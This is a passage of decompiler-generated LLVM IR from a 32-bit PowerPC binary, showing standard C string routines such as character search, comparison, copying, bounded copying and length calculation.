  %v0_1000de4c10 = phi i32 [ %v0_1000de2c2, %dec_label_pc_1000de0c ], [ %v1_1000de28, %dec_label_pc_1000de28 ]
  %v0_1000de34 = phi i32 [ %v1_1000de0c, %dec_label_pc_1000de0c ], [ %v0_1000de34.pre, %dec_label_pc_1000de28 ]
  %v1_1000de34 = mul i32 %v0_1000de34, 256
  %v2_1000de3c = or i32 %v1_1000de34, %v0_1000de34
  %v1_1000de44 = mul i32 %v2_1000de3c, 65536
  %v2_1000de48 = or i32 %v1_1000de44, %v2_1000de3c
  br label %dec_label_pc_1000de4c

dec_label_pc_1000de4c:                            ; preds = %dec_label_pc_1000de4c, %dec_label_pc_1000df00, %dec_label_pc_1000de34
  %v0_1000dea4 = phi i32 [ %v0_1000de4c10, %dec_label_pc_1000de34 ], [ %v1_1000de50, %dec_label_pc_1000df00 ], [ %v1_1000de50, %dec_label_pc_1000de4c ]
  %v1_1000de4c = inttoptr i32 %v0_1000dea4 to i32*
  %v2_1000de4c = load i32, i32* %v1_1000de4c, align 4
  %v1_1000de50 = add i32 %v0_1000dea4, 4
  %v2_1000de58 = xor i32 %v2_1000de4c, %v2_1000de48
  %v1_1000de64 = add i32 %v2_1000de4c, 2130640639
  %v1_1000de68 = add i32 %v2_1000de58, 2130640639
  %v2_1000de6c = xor i32 %v1_1000de64, %v2_1000de4c
  %v2_1000de70 = xor i32 %v1_1000de68, %v2_1000de58
  %v2_1000de74 = and i32 %v2_1000de6c, -2130640640
  %v3_1000de74 = xor i32 %v2_1000de74, -2130640640
  %v2_1000de78 = and i32 %v2_1000de70, -2130640640
  %v3_1000de78 = xor i32 %v2_1000de78, -2130640640
  %tmp = or i32 %v3_1000de78, %v3_1000de74
  %tmp16 = icmp eq i32 %tmp, 0
  br i1 %tmp16, label %dec_label_pc_1000de4c, label %dec_label_pc_1000de88

dec_label_pc_1000de88:                            ; preds = %dec_label_pc_1000de4c
  %v2_1000de88 = inttoptr i32 %v0_1000dea4 to i8*
  %v3_1000de88 = load i8, i8* %v2_1000de88, align 1
  %v4_1000de88 = zext i8 %v3_1000de88 to i32
  %v1_1000de8c = add i32 %v0_1000dea4, 1
  %v1_1000de90 = add i32 %v0_1000dea4, 2
  %v1_1000de94 = add i32 %v0_1000dea4, 3
  %v4_1000de98 = icmp eq i32 %v4_1000de88, %v0_1000de34
  br i1 %v4_1000de98, label %dec_label_pc_1000dea4, label %dec_label_pc_1000deac

dec_label_pc_1000dea4:                            ; preds = %dec_label_pc_1000de88
  ret i32 %v0_1000dea4

dec_label_pc_1000deac:                            ; preds = %dec_label_pc_1000de88
  %v3_1000de9c = icmp eq i8 %v3_1000de88, 0
  br i1 %v3_1000de9c, label %dec_label_pc_1000df04, label %dec_label_pc_1000deb0

dec_label_pc_1000deb0:                            ; preds = %dec_label_pc_1000deac
  %v2_1000deb0 = inttoptr i32 %v1_1000de8c to i8*
  %v3_1000deb0 = load i8, i8* %v2_1000deb0, align 1
  %v4_1000deb0 = zext i8 %v3_1000deb0 to i32
  %v4_1000deb4 = icmp eq i32 %v4_1000deb0, %v0_1000de34
  br i1 %v4_1000deb4, label %dec_label_pc_1000dec0, label %dec_label_pc_1000dec8

dec_label_pc_1000dec0:                            ; preds = %dec_label_pc_1000deb0
  ret i32 %v1_1000de8c

dec_label_pc_1000dec8:                            ; preds = %dec_label_pc_1000deb0
  %v3_1000deb8 = icmp eq i8 %v3_1000deb0, 0
  br i1 %v3_1000deb8, label %dec_label_pc_1000df04, label %dec_label_pc_1000decc

dec_label_pc_1000decc:                            ; preds = %dec_label_pc_1000dec8
  %v2_1000decc = inttoptr i32 %v1_1000de90 to i8*
  %v3_1000decc = load i8, i8* %v2_1000decc, align 1
  %v4_1000decc = zext i8 %v3_1000decc to i32
  %v4_1000ded0 = icmp eq i32 %v4_1000decc, %v0_1000de34
  br i1 %v4_1000ded0, label %dec_label_pc_1000dedc, label %dec_label_pc_1000dee4

dec_label_pc_1000dedc:                            ; preds = %dec_label_pc_1000decc
  ret i32 %v1_1000de90

dec_label_pc_1000dee4:                            ; preds = %dec_label_pc_1000decc
  %v3_1000ded4 = icmp eq i8 %v3_1000decc, 0
  br i1 %v3_1000ded4, label %dec_label_pc_1000df04, label %dec_label_pc_1000dee8

dec_label_pc_1000dee8:                            ; preds = %dec_label_pc_1000dee4
  %v2_1000dee8 = inttoptr i32 %v1_1000de94 to i8*
  %v3_1000dee8 = load i8, i8* %v2_1000dee8, align 1
  %v4_1000dee8 = zext i8 %v3_1000dee8 to i32
  %v4_1000deec = icmp eq i32 %v4_1000dee8, %v0_1000de34
  br i1 %v4_1000deec, label %dec_label_pc_1000def8, label %dec_label_pc_1000df00

dec_label_pc_1000def8:                            ; preds = %dec_label_pc_1000dee8
  ret i32 %v1_1000de94

dec_label_pc_1000df00:                            ; preds = %dec_label_pc_1000dee8
  %v3_1000def0 = icmp eq i8 %v3_1000dee8, 0
  br i1 %v3_1000def0, label %dec_label_pc_1000df04, label %dec_label_pc_1000de4c

dec_label_pc_1000df04:                            ; preds = %dec_label_pc_1000de14, %dec_label_pc_1000df00, %dec_label_pc_1000dee4, %dec_label_pc_1000dec8, %dec_label_pc_1000deac
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000de50, { 1, 0 }
  uselistorder i32 %v2_1000de4c, { 0, 2, 1 }
  uselistorder i32 %v0_1000dea4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v2_1000de3c, { 1, 0 }
  uselistorder i32 %v0_1000de34, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000de28, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000de2c2, { 2, 1, 0 }
  uselistorder i32 %v1_1000de0c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000df04, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000de4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000de14, { 1, 0 }
}

define i32 @function_1000df0c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000df0c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000df18.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000df10

dec_label_pc_1000df10:                            ; preds = %dec_label_pc_1000df34, %dec_label_pc_1000df0c
  %v0_1000df18 = phi i32 [ %v1_1000df1c, %dec_label_pc_1000df34 ], [ %v0_1000df18.pre, %dec_label_pc_1000df0c ]
  %v0_1000df10 = phi i32 [ %v1_1000df14, %dec_label_pc_1000df34 ], [ %tmp, %dec_label_pc_1000df0c ]
  %v1_1000df10 = inttoptr i32 %v0_1000df10 to i8*
  %v2_1000df10 = load i8, i8* %v1_1000df10, align 1
  %v3_1000df10 = zext i8 %v2_1000df10 to i32
  %v1_1000df18 = inttoptr i32 %v0_1000df18 to i8*
  %v2_1000df18 = load i8, i8* %v1_1000df18, align 1
  %v3_1000df18 = zext i8 %v2_1000df18 to i32
  %v3_1000df20 = icmp eq i8 %v2_1000df10, 0
  br i1 %v3_1000df20, label %dec_label_pc_1000df2c, label %dec_label_pc_1000df34

dec_label_pc_1000df2c:                            ; preds = %dec_label_pc_1000df10
  %v1_1000df2c = sub nsw i32 0, %v3_1000df18
  ret i32 %v1_1000df2c

dec_label_pc_1000df34:                            ; preds = %dec_label_pc_1000df10
  %v4_1000df24 = icmp eq i8 %v2_1000df10, %v2_1000df18
  %v1_1000df1c = add i32 %v0_1000df18, 1
  %v1_1000df14 = add i32 %v0_1000df10, 1
  br i1 %v4_1000df24, label %dec_label_pc_1000df10, label %dec_label_pc_1000df38

dec_label_pc_1000df38:                            ; preds = %dec_label_pc_1000df34
  %v2_1000df38 = sub nsw i32 %v3_1000df10, %v3_1000df18
  ret i32 %v2_1000df38

; uselistorder directives
  uselistorder i32 %v3_1000df18, { 1, 0 }
  uselistorder i32 %v0_1000df10, { 1, 0 }
  uselistorder i32 %v0_1000df18, { 1, 0 }
}

define i32 @function_1000df40(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_1000df40:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1000df40 = add i32 %arg1, -1
  %v1_1000df44 = sub i32 %v2_1000df40, %tmp
  store i32 %v1_1000df44, i32* %r9.global-to-local, align 4
  %v2_1000df484 = load i8, i8* %arg2, align 1
  %v1_1000df4c6 = add i32 %tmp, 1
  store i32 %v1_1000df4c6, i32* %r4.global-to-local, align 4
  %v3_1000df508 = icmp eq i8 %v2_1000df484, 0
  store i1 %v3_1000df508, i1* %cr7_eq.global-to-local, align 1
  %v5_1000df549 = inttoptr i32 %arg1 to i8*
  store i8 %v2_1000df484, i8* %v5_1000df549, align 1
  %v0_1000df5810 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000df5810, label %dec_label_pc_1000df5c, label %dec_label_pc_1000df48.dec_label_pc_1000df48_crit_edge

dec_label_pc_1000df48.dec_label_pc_1000df48_crit_edge: ; preds = %dec_label_pc_1000df40, %dec_label_pc_1000df48.dec_label_pc_1000df48_crit_edge
  %v0_1000df48.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1000df54.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000df48 = inttoptr i32 %v0_1000df48.pre to i8*
  %v2_1000df48 = load i8, i8* %v1_1000df48, align 1
  %v1_1000df4c = add i32 %v0_1000df48.pre, 1
  store i32 %v1_1000df4c, i32* %r4.global-to-local, align 4
  %v3_1000df50 = icmp eq i8 %v2_1000df48, 0
  store i1 %v3_1000df50, i1* %cr7_eq.global-to-local, align 1
  %v4_1000df54 = add i32 %v1_1000df4c, %v2_1000df54.pre
  %v5_1000df54 = inttoptr i32 %v4_1000df54 to i8*
  store i8 %v2_1000df48, i8* %v5_1000df54, align 1
  %v0_1000df58 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000df58, label %dec_label_pc_1000df5c, label %dec_label_pc_1000df48.dec_label_pc_1000df48_crit_edge

dec_label_pc_1000df5c:                            ; preds = %dec_label_pc_1000df48.dec_label_pc_1000df48_crit_edge, %dec_label_pc_1000df40
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000df48.dec_label_pc_1000df48_crit_edge, { 1, 0 }
}

define i32 @function_1000df60() local_unnamed_addr {
dec_label_pc_1000df60:
  %v0_1000df60 = load i32, i32* @r3, align 4
  %v1_1000df783 = urem i32 %v0_1000df60, 4
  %v3_1000df785 = icmp eq i32 %v1_1000df783, 0
  br i1 %v3_1000df785, label %dec_label_pc_1000df80, label %dec_label_pc_1000df68

dec_label_pc_1000df68:                            ; preds = %dec_label_pc_1000df60, %dec_label_pc_1000df74
  %v0_1000df74 = phi i32 [ %v1_1000df74, %dec_label_pc_1000df74 ], [ %v0_1000df60, %dec_label_pc_1000df60 ]
  %v1_1000df68 = inttoptr i32 %v0_1000df74 to i8*
  %v2_1000df68 = load i8, i8* %v1_1000df68, align 1
  %v3_1000df6c = icmp eq i8 %v2_1000df68, 0
  br i1 %v3_1000df6c, label %dec_label_pc_1000dfb4, label %dec_label_pc_1000df74

dec_label_pc_1000df74:                            ; preds = %dec_label_pc_1000df68
  %v1_1000df74 = add i32 %v0_1000df74, 1
  %v1_1000df78 = urem i32 %v1_1000df74, 4
  %v3_1000df78 = icmp eq i32 %v1_1000df78, 0
  br i1 %v3_1000df78, label %dec_label_pc_1000df80, label %dec_label_pc_1000df68

dec_label_pc_1000df80:                            ; preds = %dec_label_pc_1000df74, %dec_label_pc_1000df60
  %v0_1000df84 = phi i32 [ %v0_1000df60, %dec_label_pc_1000df60 ], [ %v1_1000df74, %dec_label_pc_1000df74 ]
  store i32 -2139062144, i32* @r8, align 4
  br label %dec_label_pc_1000df8c

dec_label_pc_1000df8c:                            ; preds = %dec_label_pc_1000dfec, %dec_label_pc_1000df8c, %dec_label_pc_1000df80
  %v1_1000dfc8 = phi i32 [ %v0_1000df84, %dec_label_pc_1000df80 ], [ %v1_1000df90, %dec_label_pc_1000df8c ], [ %v1_1000df90, %dec_label_pc_1000dfec ]
  %v1_1000df8c = inttoptr i32 %v1_1000dfc8 to i32*
  %v2_1000df8c = load i32, i32* %v1_1000df8c, align 4
  %v1_1000df90 = add i32 %v1_1000dfc8, 4
  %v1_1000df9c = add i32 %v2_1000df8c, -16843009
  %v2_1000dfa0 = and i32 %v1_1000df9c, -2139062144
  %v5_1000dfa0 = icmp eq i32 %v2_1000dfa0, 0
  br i1 %v5_1000dfa0, label %dec_label_pc_1000df8c, label %dec_label_pc_1000dfa8

dec_label_pc_1000dfa8:                            ; preds = %dec_label_pc_1000df8c
  %v2_1000dfa8 = inttoptr i32 %v1_1000dfc8 to i8*
  %v3_1000dfa8 = load i8, i8* %v2_1000dfa8, align 1
  %v3_1000dfac = icmp eq i8 %v3_1000dfa8, 0
  br i1 %v3_1000dfac, label %dec_label_pc_1000dfb4, label %dec_label_pc_1000dfbc

dec_label_pc_1000dfb4:                            ; preds = %dec_label_pc_1000df68, %dec_label_pc_1000dfa8
  %v1_1000dfb4 = phi i32 [ %v1_1000dfc8, %dec_label_pc_1000dfa8 ], [ %v0_1000df74, %dec_label_pc_1000df68 ]
  %v2_1000dfb4 = sub i32 %v1_1000dfb4, %v0_1000df60
  ret i32 %v2_1000dfb4

dec_label_pc_1000dfbc:                            ; preds = %dec_label_pc_1000dfa8
  %v1_1000dfbc = add i32 %v1_1000dfc8, 1
  %v2_1000dfbc = inttoptr i32 %v1_1000dfbc to i8*
  %v3_1000dfbc = load i8, i8* %v2_1000dfbc, align 1
  %v3_1000dfc0 = icmp eq i8 %v3_1000dfbc, 0
  br i1 %v3_1000dfc0, label %dec_label_pc_1000dfc8, label %dec_label_pc_1000dfd4

dec_label_pc_1000dfc8:                            ; preds = %dec_label_pc_1000dfbc
  %v2_1000dfc8 = sub i32 %v1_1000dfc8, %v0_1000df60
  %v1_1000dfcc = add i32 %v2_1000dfc8, 1
  ret i32 %v1_1000dfcc

dec_label_pc_1000dfd4:                            ; preds = %dec_label_pc_1000dfbc
  %v1_1000dfd4 = add i32 %v1_1000dfc8, 2
  %v2_1000dfd4 = inttoptr i32 %v1_1000dfd4 to i8*
  %v3_1000dfd4 = load i8, i8* %v2_1000dfd4, align 1
  %v3_1000dfd8 = icmp eq i8 %v3_1000dfd4, 0
  br i1 %v3_1000dfd8, label %dec_label_pc_1000dfe0, label %dec_label_pc_1000dfec

dec_label_pc_1000dfe0:                            ; preds = %dec_label_pc_1000dfd4
  %v2_1000dfe0 = sub i32 %v1_1000dfc8, %v0_1000df60
  %v1_1000dfe4 = add i32 %v2_1000dfe0, 2
  ret i32 %v1_1000dfe4

dec_label_pc_1000dfec:                            ; preds = %dec_label_pc_1000dfd4
  %v1_1000dfec = add i32 %v1_1000dfc8, 3
  %v2_1000dfec = inttoptr i32 %v1_1000dfec to i8*
  %v3_1000dfec = load i8, i8* %v2_1000dfec, align 1
  %v3_1000dff0 = icmp eq i8 %v3_1000dfec, 0
  br i1 %v3_1000dff0, label %dec_label_pc_1000dff8, label %dec_label_pc_1000df8c

dec_label_pc_1000dff8:                            ; preds = %dec_label_pc_1000dfec
  %v2_1000dff8 = sub i32 %v1_1000dfc8, %v0_1000df60
  %v1_1000dffc = add i32 %v2_1000dff8, 3
  ret i32 %v1_1000dffc

; uselistorder directives
  uselistorder i32 %v1_1000df90, { 1, 0 }
  uselistorder i32 %v1_1000dfc8, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_1000df74, { 1, 0, 2 }
  uselistorder i32 %v0_1000df60, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000dfb4, { 1, 0 }
  uselistorder label %dec_label_pc_1000df68, { 1, 0 }
}

define i32 @function_1000e004(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000e004:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %v3_1000e004 = icmp eq i32 %arg2, 3
  store i1 %v3_1000e004, i1* %cr7_eq.global-to-local, align 1
  %v1_1000e008 = add i32 %arg1, -1
  store i32 %v1_1000e008, i32* %r10.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1000e084, label %dec_label_pc_1000e010

dec_label_pc_1000e010:                            ; preds = %dec_label_pc_1000e004
  %v1_1000e010 = udiv i32 %arg2, 4
  store i32 %v1_1000e010, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000e018

dec_label_pc_1000e018:                            ; preds = %dec_label_pc_1000e068, %dec_label_pc_1000e010
  %v2_1000e028 = phi i32 [ %v3_1000e060, %dec_label_pc_1000e068 ], [ %v1_1000e008, %dec_label_pc_1000e010 ]
  %v0_1000e018 = load i32, i32* @r4, align 4
  %v1_1000e018 = inttoptr i32 %v0_1000e018 to i8*
  %v2_1000e018 = load i8, i8* %v1_1000e018, align 1
  %v1_1000e01c = add i32 %v0_1000e018, 1
  store i32 %v1_1000e01c, i32* %r11.global-to-local, align 4
  %v1_1000e020 = add i32 %v0_1000e018, 2
  store i32 %v1_1000e020, i32* @r8, align 4
  %v3_1000e024 = icmp eq i8 %v2_1000e018, 0
  store i1 %v3_1000e024, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e028 = add i32 %v2_1000e028, 1
  %v4_1000e028 = inttoptr i32 %v3_1000e028 to i8*
  store i8 %v2_1000e018, i8* %v4_1000e028, align 1
  store i32 %v3_1000e028, i32* %r10.global-to-local, align 4
  %v0_1000e02c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e02c, label %dec_label_pc_1000e070, label %dec_label_pc_1000e030

dec_label_pc_1000e030:                            ; preds = %dec_label_pc_1000e018
  %v0_1000e030 = load i32, i32* @r4, align 4
  %v1_1000e030 = add i32 %v0_1000e030, 1
  %v2_1000e030 = inttoptr i32 %v1_1000e030 to i8*
  %v3_1000e030 = load i8, i8* %v2_1000e030, align 1
  %v0_1000e034 = load i32, i32* @r8, align 4
  %v1_1000e038 = add i32 %v0_1000e034, 2
  store i32 %v1_1000e038, i32* @r4, align 4
  %v3_1000e03c = icmp eq i8 %v3_1000e030, 0
  store i1 %v3_1000e03c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e040 = add i32 %v2_1000e028, 2
  %v4_1000e040 = inttoptr i32 %v3_1000e040 to i8*
  store i8 %v3_1000e030, i8* %v4_1000e040, align 1
  store i32 %v3_1000e040, i32* %r10.global-to-local, align 4
  %v0_1000e044 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e044, label %dec_label_pc_1000e070, label %dec_label_pc_1000e048

dec_label_pc_1000e048:                            ; preds = %dec_label_pc_1000e030
  %v0_1000e048 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e048 = add i32 %v0_1000e048, 1
  %v2_1000e048 = inttoptr i32 %v1_1000e048 to i8*
  %v3_1000e048 = load i8, i8* %v2_1000e048, align 1
  %v3_1000e04c = icmp eq i8 %v3_1000e048, 0
  store i1 %v3_1000e04c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e050 = add i32 %v2_1000e028, 3
  %v4_1000e050 = inttoptr i32 %v3_1000e050 to i8*
  store i8 %v3_1000e048, i8* %v4_1000e050, align 1
  store i32 %v3_1000e050, i32* %r10.global-to-local, align 4
  %v0_1000e054 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e054, label %dec_label_pc_1000e070, label %dec_label_pc_1000e058

dec_label_pc_1000e058:                            ; preds = %dec_label_pc_1000e048
  %v0_1000e058 = load i32, i32* @r8, align 4
  %v1_1000e058 = add i32 %v0_1000e058, 1
  %v2_1000e058 = inttoptr i32 %v1_1000e058 to i8*
  %v3_1000e058 = load i8, i8* %v2_1000e058, align 1
  %v3_1000e05c = icmp eq i8 %v3_1000e058, 0
  store i1 %v3_1000e05c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e060 = add i32 %v2_1000e028, 4
  %v4_1000e060 = inttoptr i32 %v3_1000e060 to i8*
  store i8 %v3_1000e058, i8* %v4_1000e060, align 1
  store i32 %v3_1000e060, i32* %r10.global-to-local, align 4
  %v0_1000e064 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e064, label %dec_label_pc_1000e070, label %dec_label_pc_1000e068

dec_label_pc_1000e068:                            ; preds = %dec_label_pc_1000e058
  %v0_1000e068 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e068 = add i32 %v0_1000e068, -1
  store i32 %v1_1000e068, i32* %ctr.global-to-local, align 4
  %v2_1000e068 = icmp eq i32 %v1_1000e068, 0
  br i1 %v2_1000e068, label %dec_label_pc_1000e084, label %dec_label_pc_1000e018

dec_label_pc_1000e070:                            ; preds = %dec_label_pc_1000e058, %dec_label_pc_1000e048, %dec_label_pc_1000e030, %dec_label_pc_1000e018
  %v1_1000e070 = phi i32 [ %v3_1000e060, %dec_label_pc_1000e058 ], [ %v3_1000e050, %dec_label_pc_1000e048 ], [ %v3_1000e040, %dec_label_pc_1000e030 ], [ %v3_1000e028, %dec_label_pc_1000e018 ]
  %v2_1000e07011 = sub i32 %arg1, %v1_1000e070
  %v2_1000e074 = add i32 %v2_1000e07011, %arg2
  %v1_1000e078 = add i32 %v2_1000e074, -1
  store i32 %v1_1000e078, i32* %r11.global-to-local, align 4
  %v4_1000e078 = icmp eq i32 %v1_1000e078, 0
  %v0_1000e07c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000e078, i32 %v0_1000e07c)
  %v2_1000e0b4.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000e0ac

dec_label_pc_1000e084:                            ; preds = %dec_label_pc_1000e068, %dec_label_pc_1000e004
  %v1_1000e084 = urem i32 %arg2, 4
  store i32 %v1_1000e084, i32* %r11.global-to-local, align 4
  %v3_1000e084 = icmp eq i32 %v1_1000e084, 0
  %v0_1000e088 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e084, i32 %v0_1000e088)
  store i32 %v1_1000e084, i32* %ctr.global-to-local, align 4
  %v2_1000e0a0.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000e090

dec_label_pc_1000e090:                            ; preds = %dec_label_pc_1000e0a8.dec_label_pc_1000e090_crit_edge, %dec_label_pc_1000e084
  %v2_1000e0a0 = phi i32 [ %v3_1000e0a0, %dec_label_pc_1000e0a8.dec_label_pc_1000e090_crit_edge ], [ %v2_1000e0a0.pre, %dec_label_pc_1000e084 ]
  %v0_1000e094 = phi i32 [ %v0_1000e094.pre, %dec_label_pc_1000e0a8.dec_label_pc_1000e090_crit_edge ], [ %v1_1000e084, %dec_label_pc_1000e084 ]
  %v0_1000e090 = load i32, i32* @r4, align 4
  %v1_1000e090 = inttoptr i32 %v0_1000e090 to i8*
  %v2_1000e090 = load i8, i8* %v1_1000e090, align 1
  %v1_1000e094 = add i32 %v0_1000e094, -1
  store i32 %v1_1000e094, i32* %r11.global-to-local, align 4
  %v1_1000e098 = add i32 %v0_1000e090, 1
  store i32 %v1_1000e098, i32* @r4, align 4
  %v3_1000e09c = icmp eq i8 %v2_1000e090, 0
  store i1 %v3_1000e09c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e0a0 = add i32 %v2_1000e0a0, 1
  %v4_1000e0a0 = inttoptr i32 %v3_1000e0a0 to i8*
  store i8 %v2_1000e090, i8* %v4_1000e0a0, align 1
  store i32 %v3_1000e0a0, i32* %r10.global-to-local, align 4
  %v0_1000e0a4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e0a4 = add i32 %v0_1000e0a4, -1
  store i32 %v1_1000e0a4, i32* %ctr.global-to-local, align 4
  %v2_1000e0a4 = icmp eq i32 %v1_1000e0a4, 0
  br i1 %v2_1000e0a4, label %dec_label_pc_1000e0bc, label %dec_label_pc_1000e0a8

dec_label_pc_1000e0a8:                            ; preds = %dec_label_pc_1000e090
  %v0_1000e0a8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e0a8, label %dec_label_pc_1000e0ac, label %dec_label_pc_1000e0a8.dec_label_pc_1000e090_crit_edge

dec_label_pc_1000e0a8.dec_label_pc_1000e090_crit_edge: ; preds = %dec_label_pc_1000e0a8
  %v0_1000e094.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e090

dec_label_pc_1000e0ac:                            ; preds = %dec_label_pc_1000e0a8, %dec_label_pc_1000e070
  %v2_1000e0b4.pre = phi i32 [ %v2_1000e0b4.pre.pre, %dec_label_pc_1000e070 ], [ %v3_1000e0a0, %dec_label_pc_1000e0a8 ]
  %v0_1000e0ac = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000e0ac, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000e0b0

dec_label_pc_1000e0b0:                            ; preds = %dec_label_pc_1000e0b0, %dec_label_pc_1000e0ac
  %v2_1000e0b4 = phi i32 [ %v3_1000e0b4, %dec_label_pc_1000e0b0 ], [ %v2_1000e0b4.pre, %dec_label_pc_1000e0ac ]
  %v3_1000e0b4 = add i32 %v2_1000e0b4, 1
  %v4_1000e0b4 = inttoptr i32 %v3_1000e0b4 to i8*
  store i8 0, i8* %v4_1000e0b4, align 1
  store i32 %v3_1000e0b4, i32* %r10.global-to-local, align 4
  %v0_1000e0b8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e0b8 = add i32 %v0_1000e0b8, -1
  store i32 %v1_1000e0b8, i32* %ctr.global-to-local, align 4
  %v2_1000e0b8 = icmp eq i32 %v1_1000e0b8, 0
  br i1 %v2_1000e0b8, label %dec_label_pc_1000e0bc, label %dec_label_pc_1000e0b0

dec_label_pc_1000e0bc:                            ; preds = %dec_label_pc_1000e090, %dec_label_pc_1000e0b0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000e0b8, { 1, 0 }
  uselistorder i32 %v3_1000e0b4, { 1, 2, 0 }
  uselistorder i32 %v1_1000e0a4, { 1, 0 }
  uselistorder i32 %v3_1000e0a0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000e084, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000e068, { 1, 0 }
  uselistorder i32 %v3_1000e060, { 0, 2, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e0bc, { 1, 0 }
}

define i32 @function_1000e0c0(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000e0c0:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000e0c0 = load i32, i32* @r4, align 4
  %v3_1000e0c0 = icmp eq i32 %v0_1000e0c0, 0
  store i32 %tmp, i32* @r8, align 4
  %v0_1000e0cc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e0c0, i32 %v0_1000e0cc)
  %v0_1000e0dc = load i32, i32* @r8, align 4
  %v1_1000e0dc = load i32, i32* @r4, align 4
  %v2_1000e0dc = add i32 %v1_1000e0dc, %v0_1000e0dc
  %v3_1000e0e0 = icmp ugt i32 %v2_1000e0dc, %v0_1000e0dc
  %v4_1000e0e0 = icmp eq i32 %v1_1000e0dc, 0
  %v2_1000e0e4 = or i1 %v4_1000e0e0, %v3_1000e0e0
  br i1 %v2_1000e0e4, label %dec_label_pc_1000e0ec, label %dec_label_pc_1000e0e8

dec_label_pc_1000e0d4:                            ; preds = %dec_label_pc_1000e154
  br label %dec_label_pc_1000e198

dec_label_pc_1000e0e8:                            ; preds = %dec_label_pc_1000e0c0
  br label %dec_label_pc_1000e0ec

dec_label_pc_1000e0ec:                            ; preds = %dec_label_pc_1000e0c0, %dec_label_pc_1000e0e8
  %v0_1000e19c = phi i32 [ %v2_1000e0dc, %dec_label_pc_1000e0c0 ], [ -1, %dec_label_pc_1000e0e8 ]
  %v1_1000e11c6 = urem i32 %v0_1000e0dc, 4
  %v3_1000e11c8 = icmp eq i32 %v1_1000e11c6, 0
  br i1 %v3_1000e11c8, label %dec_label_pc_1000e124, label %dec_label_pc_1000e0f4

dec_label_pc_1000e0f4:                            ; preds = %dec_label_pc_1000e0ec, %dec_label_pc_1000e118
  %v0_1000e10c = phi i32 [ %v1_1000e118, %dec_label_pc_1000e118 ], [ %v0_1000e0dc, %dec_label_pc_1000e0ec ]
  %v1_1000e0f4 = inttoptr i32 %v0_1000e10c to i8*
  %v2_1000e0f4 = load i8, i8* %v1_1000e0f4, align 1
  %v3_1000e0f8 = icmp eq i8 %v2_1000e0f4, 0
  br i1 %v3_1000e0f8, label %dec_label_pc_1000e100, label %dec_label_pc_1000e118

dec_label_pc_1000e100:                            ; preds = %dec_label_pc_1000e0f4
  %v3_1000e100 = icmp ugt i32 %v0_1000e19c, %v0_1000e10c
  %v0_1000e10c.v0_1000e19c = select i1 %v3_1000e100, i32 %v0_1000e10c, i32 %v0_1000e19c
